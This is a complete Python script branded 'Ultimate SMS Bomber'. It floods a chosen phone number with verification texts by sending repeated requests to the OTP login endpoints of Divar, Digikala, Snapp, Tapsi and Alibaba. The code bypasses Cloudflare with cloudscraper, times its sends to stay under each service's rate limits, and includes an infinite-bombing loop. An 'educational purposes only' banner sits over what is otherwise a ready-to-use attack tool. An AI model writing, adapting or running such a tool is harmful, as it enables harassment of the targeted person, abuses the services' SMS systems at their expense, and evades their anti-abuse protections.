import os
import sys
import time
import requests
import cloudscraper
from colorama import Fore, Style, init

init(autoreset=True)

# =====================================================================
# Global Settings
# =====================================================================
VERSION = "2.0"

# Cooldown duration (seconds) per service after rate limit
COOLDOWN = {
    "Divar": 30,
    "Digikala": 300,
    "Snapp": 5,
    "Tapsi": 120,
    "Alibaba": 60,
}

# Cooldown end times
cooldown_until = {}

# Statistics
stats = {
    "total_attempts": 0,
    "success": 0,
    "failed": 0,
    "limited": 0,
}

# =====================================================================
# Helper Functions
# =====================================================================
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def show_banner():
    clear_screen()
    print(Fore.RED + r"""
   ███████╗███╗   ███╗███████╗    ██████╗  ██████╗ ███╗   ███╗██████╗ 
   ██╔════╝████╗ ████║██╔════╝    ██╔══██╗██╔═══██╗████╗ ████║██╔══██╗
   ███████╗██╔████╔██║███████╗    ██████╔╝██║   ██║██╔████╔██║██████╔╝
   ╚════██║██║╚██╔╝██║╚════██║    ██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗
   ███████║██║ ╚═╝ ██║███████║    ██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝
   ╚══════╝╚═╝     ╚═╝╚══════╝    ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ 
    """)
    print(Fore.YELLOW + f"           Ultimate SMS Bomber  |  Version {VERSION}")
    print(Fore.RED + "   ⚠️  For personal testing and educational purposes only!\n")

def normalize_snap_phone(phone):
    """Convert phone number to +98 format for Snapp"""
    if phone.startswith('0'):
        phone = phone[1:]
    return f"+98{phone}"

def is_ready(service_name):
    """Check if service is ready or in cooldown"""
    if service_name in cooldown_until:
        if time.time() < cooldown_until[service_name]:
            remaining = int(cooldown_until[service_name] - time.time())
            print(Fore.YELLOW + f"   ⏸️ [{service_name}] in cooldown ({remaining}s remaining)")
            return False
        else:
            del cooldown_until[service_name]
    return True

def set_cooldown(service_name):
    """Set cooldown for a service after an error"""
    duration = COOLDOWN.get(service_name, 60)
    cooldown_until[service_name] = time.time() + duration
    print(Fore.YELLOW + f"   ⏳ [{service_name}] put in cooldown for {duration} seconds.")

def current_time():
    return time.strftime('%H:%M:%S')

# =====================================================================
# Services
# =====================================================================
def send_divar(phone_number):
    if not is_ready("Divar"): return
    url = "https://api.divar.ir/v8/auth/open-initiate-page"
    scraper = cloudscraper.create_scraper()
    headers = {
        "accept": "application/json-divar-filled",
        "content-type": "application/json",
        "origin": "https://divar.ir",
        "referer": "https://divar.ir/",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.0.0 Safari/537.36",
        "x-web-serving-mode": "desktop",
        # ⚠️ Copy your cookie from browser here (if you get 403)
        "cookie": "did=...; cdid=...; ..."
    }
    payload = {
        "specification": {"page": 1, "data": {"data": {
            "phone": {"str": {"value": phone_number}},
            "send_code_method": {"str": {"value": "SMS"}}
        }}},
        "is_reload": False
    }
    try:
        response = scraper.post(url, json=payload, headers=headers)
        if response.status_code == 200:
            print(Fore.GREEN + f"✅ [Divar] [{current_time()}] SMS sent.")
            stats["success"] += 1
        elif response.status_code == 429:
            print(Fore.RED + f"❌ [Divar] [{current_time()}] Rate limit: {response.text[:80]}")
            set_cooldown("Divar"); stats["limited"] += 1
        else:
            print(Fore.RED + f"❌ [Divar] [{current_time()}] Error {response.status_code}: {response.text[:80]}")
            stats["failed"] += 1
    except Exception as e:
        print(Fore.RED + f"⚠️ [Divar] Error: {e}")
        stats["failed"] += 1

def send_digikala(phone_number):
    if not is_ready("Digikala"): return
    url = "https://api.digikala.com/v1/user/authenticate/"
    session = requests.Session()
    headers = {
        "content-type": "application/json",
        "origin": "https://www.digikala.com",
        "referer": "https://www.digikala.com/",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    }
    payload = {"backUrl": "/", "username": phone_number, "otp_call": "false"}
    try:
        response = session.post(url, json=payload, headers=headers)
        if response.status_code == 200:
            print(Fore.GREEN + f"✅ [Digikala] [{current_time()}] SMS sent.")
            stats["success"] += 1
        elif response.status_code == 400:
            print(Fore.RED + f"❌ [Digikala] [{current_time()}] Rate limit: {response.text[:80]}")
            set_cooldown("Digikala"); stats["limited"] += 1
        else:
            print(Fore.RED + f"❌ [Digikala] [{current_time()}] Error {response.status_code}: {response.text[:80]}")
            stats["failed"] += 1
    except Exception as e:
        print(Fore.RED + f"⚠️ [Digikala] Error: {e}")
        stats["failed"] += 1

def send_snapp(phone_number):
    if not is_ready("Snapp"): return
    url = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
    scraper = cloudscraper.create_scraper()
    headers = {
        "content-type": "application/json",
        "origin": "https://snapp.ir",
        "referer": "https://snapp.ir/",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "x-requested-with": "XMLHttpRequest"
    }
    payload = {"cellphone": normalize_snap_phone(phone_number)}
    try:
        response = scraper.post(url, json=payload, headers=headers)
        if response.status_code == 200:
            print(Fore.GREEN + f"✅ [Snapp] [{current_time()}] Request sent (SMS only if new number).")
            stats["success"] += 1
        elif response.status_code == 429:
            print(Fore.RED + f"❌ [Snapp] [{current_time()}] Rate limit: {response.text[:80]}")
            set_cooldown("Snapp"); stats["limited"] += 1
        else:
            print(Fore.RED + f"❌ [Snapp] [{current_time()}] Error {response.status_code}: {response.text[:80]}")
            stats["failed"] += 1
    except Exception as e:
        print(Fore.RED + f"⚠️ [Snapp] Error: {e}")
        stats["failed"] += 1

def send_tapsi(phone_number):
    if not is_ready("Tapsi"): return
    url = "https://tap33.me/api/v2/user"
    session = requests.Session()
    headers = {
        "content-type": "application/json",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    }
    payload = {"credential": {"phoneNumber": phone_number, "role": "PASSENGER"}}
    try:
        response = session.post(url, json=payload, headers=headers)
        if response.status_code == 200:
            print(Fore.GREEN + f"✅ [Tapsi] [{current_time()}] SMS sent.")
            stats["success"] += 1
        elif response.status_code in (406, 429):
            print(Fore.RED + f"❌ [Tapsi] [{current_time()}] Rate limit: {response.text[:80]}")
            set_cooldown("Tapsi"); stats["limited"] += 1
        else:
            print(Fore.RED + f"❌ [Tapsi] [{current_time()}] Error {response.status_code}: {response.text[:80]}")
            stats["failed"] += 1
    except Exception as e:
        print(Fore.RED + f"⚠️ [Tapsi] Error: {e}")
        stats["failed"] += 1

def send_alibaba(phone_number):
    if not is_ready("Alibaba"): return
    url = "https://ws.alibaba.ir/api/v3/account/mobile/otp"
    scraper = cloudscraper.create_scraper()
    headers = {
        "accept": "application/json, text/plain, */*",
        "content-type": "application/json",
        "origin": "https://www.alibaba.ir",
        "referer": "https://www.alibaba.ir/",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.0.0 Safari/537.36",
        "ab-alohomora": "opwttSLZ5UF1EMoxQXx4PB",
        "ab-channel": "WEB-NEW,PRODUCTION,CSR,www.alibaba.ir,desktop,Chrome,154.0.0.0,N,N,Windows,10,3.282.1",
        "tracing-device": "N,Chrome,154.0.0.0,N,N,Windows",
        "tracing-sessionid": "1791041200703"
    }
    payload = {"phoneNumber": phone_number}
    try:
        response = scraper.post(url, json=payload, headers=headers)
        if response.status_code == 200:
            print(Fore.GREEN + f"✅ [Alibaba] [{current_time()}] SMS sent.")
            stats["success"] += 1
        elif response.status_code == 429:
            print(Fore.RED + f"❌ [Alibaba] [{current_time()}] Rate limit: {response.text[:80]}")
            set_cooldown("Alibaba"); stats["limited"] += 1
        else:
            print(Fore.RED + f"❌ [Alibaba] [{current_time()}] Error {response.status_code}: {response.text[:80]}")
            stats["failed"] += 1
    except Exception as e:
        print(Fore.RED + f"⚠️ [Alibaba] Error: {e}")
        set_cooldown("Alibaba"); stats["failed"] += 1

# =====================================================================
# Service List
# =====================================================================
ALL_SERVICES = [
    ("Divar", send_divar),
    ("Digikala", send_digikala),
    ("Snapp", send_snapp),
    ("Tapsi", send_tapsi),
    ("Alibaba", send_alibaba),
]

# =====================================================================
# Show Statistics
# =====================================================================
def show_stats():
    print(Fore.CYAN + "\n" + "=" * 50)
    print(Fore.CYAN + f"  📊 Final Statistics:")
    print(Fore.WHITE + f"  ✅ Success:      {stats['success']}")
    print(Fore.RED + f"  ❌ Failed:       {stats['failed']}")
    print(Fore.YELLOW + f"  🚫 Limited:      {stats['limited']}")
    print(Fore.CYAN + f"  🔢 Total:        {stats['total_attempts']}")
    print(Fore.CYAN + "=" * 50 + "\n")

# =====================================================================
# Mode 1: Send to All Services
# =====================================================================
def mode_all_services():
    phone = input(Fore.YELLOW + "Target phone number (e.g. 09123456789): " + Fore.WHITE)
    interval = int(input(Fore.YELLOW + "Interval between rounds (seconds): " + Fore.WHITE))
    count = int(input(Fore.YELLOW + "Number of rounds: " + Fore.WHITE))

    print(Fore.CYAN + f"\n🚀 Starting {count} rounds with {interval}s interval for {phone}\n")

    for round_num in range(count):
        print(Fore.MAGENTA + f"\n╔══════ Round {round_num + 1} of {count} ══════╗")
        for name, func in ALL_SERVICES:
            stats["total_attempts"] += 1
            try:
                func(phone)
            except Exception as e:
                print(Fore.RED + f"⚠️ [{name}] General error: {e}")
        if round_num < count - 1:
            print(Fore.CYAN + f"\n⏳ Waiting {interval} seconds...")
            time.sleep(interval)

    show_stats()

# =====================================================================
# Mode 2: Send to a Specific Service
# =====================================================================
def mode_single_service():
    print(Fore.CYAN + "\nAvailable services:")
    for i, (name, _) in enumerate(ALL_SERVICES, 1):
        print(Fore.WHITE + f"  {i}. {name}")

    choice = int(input(Fore.YELLOW + "\n👉 Enter service number: " + Fore.WHITE))
    if choice < 1 or choice > len(ALL_SERVICES):
        print(Fore.RED + "❌ Invalid choice!")
        return

    service_name, service_func = ALL_SERVICES[choice - 1]
    phone = input(Fore.YELLOW + f"\nTarget phone number: " + Fore.WHITE)
    interval = int(input(Fore.YELLOW + "Interval between sends (seconds): " + Fore.WHITE))
    count = int(input(Fore.YELLOW + "Number of sends: " + Fore.WHITE))

    print(Fore.CYAN + f"\n🚀 Starting {count} sends from {service_name} for {phone}\n")

    for send_num in range(count):
        print(Fore.MAGENTA + f"\n╔══════ Attempt {send_num + 1} of {count} ══════╗")
        stats["total_attempts"] += 1
        try:
            service_func(phone)
        except Exception as e:
            print(Fore.RED + f"⚠️ General error: {e}")
        if send_num < count - 1:
            time.sleep(interval)

    show_stats()

# =====================================================================
# Mode 3: Infinite Bombing
# =====================================================================
def mode_infinite_bomb():
    print(Fore.RED + "\n⚠️ Infinite Bombing mode: runs until Ctrl+C is pressed!")
    print(Fore.YELLOW + "  Recommendation: only for services without rate limits (e.g. Snapp).")

    phone = input(Fore.YELLOW + "\nTarget phone number: " + Fore.WHITE)
    interval = float(input(Fore.YELLOW + "Interval between sends (seconds, e.g. 0.5): " + Fore.WHITE))

    print(Fore.RED + "\n🚨 Bombing started... Press Ctrl+C to stop!\n")
    time.sleep(2)

    counter = 0
    try:
        while True:
            counter += 1
            print(Fore.MAGENTA + f"\n╔══════ Attempt {counter} ══════╗")
            for name, func in ALL_SERVICES:
                stats["total_attempts"] += 1
                try:
                    func(phone)
                except Exception:
                    pass
            time.sleep(interval)
    except KeyboardInterrupt:
        print(Fore.RED + "\n\n⛔ Bombing stopped.")
        show_stats()

# =====================================================================
# Main Menu
# =====================================================================
def main_menu():
    while True:
        show_banner()
        print(Fore.WHITE + Style.BRIGHT + "  📌 Options:")
        print(Fore.CYAN + "  ┌────────────────────────────────────────┐")
        print(Fore.CYAN + "  │ " + Fore.WHITE + "1." + Fore.GREEN + " Send to all services          " + Fore.CYAN + "│")
        print(Fore.CYAN + "  │ " + Fore.WHITE + "2." + Fore.GREEN + " Send to a specific service    " + Fore.CYAN + "│")
        print(Fore.CYAN + "  │ " + Fore.WHITE + "3." + Fore.RED + " Infinite bombing               " + Fore.CYAN + "│")
        print(Fore.CYAN + "  │ " + Fore.WHITE + "4." + Fore.YELLOW + " Show statistics               " + Fore.CYAN + "│")
        print(Fore.CYAN + "  │ " + Fore.WHITE + "0." + Fore.RED + " Exit                           " + Fore.CYAN + "│")
        print(Fore.CYAN + "  └────────────────────────────────────────┘")

        choice = input(Fore.YELLOW + "\n👉 Choice: " + Fore.WHITE)

        if choice == '1':
            mode_all_services()
        elif choice == '2':
            mode_single_service()
        elif choice == '3':
            mode_infinite_bomb()
        elif choice == '4':
            show_stats()
        elif choice == '0':
            print(Fore.GREEN + "\n👋 Goodbye!")
            sys.exit()
        else:
            print(Fore.RED + "❌ Invalid option!")

        input(Fore.YELLOW + "\n🔹 Press Enter to return to menu...")

if __name__ == "__main__":
    try:
        main_menu()
    except KeyboardInterrupt:
        print(Fore.RED + "\n\n⛔ Program terminated.")
        sys.exit()